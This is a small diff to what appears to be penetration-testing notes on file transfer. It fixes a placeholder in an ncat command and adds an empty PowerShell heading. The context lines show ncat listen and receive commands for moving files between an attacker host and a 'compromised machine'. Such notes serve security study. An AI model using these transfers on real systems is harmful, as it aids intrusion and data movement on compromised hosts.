@@ -53,5 +53,11 @@ sudo ncat -l -p <PORT> --send-only < <FILE>
 
 #### Compromised Machine Connect to Ncat to Receive the File
 ```bash
-ncat <IP> <PORT> --recv-only > <FILE
+ncat <IP> <PORT> --recv-only > <FILE>
 ```
+
+
+---
+## Power shell Session File Transfer
+
+
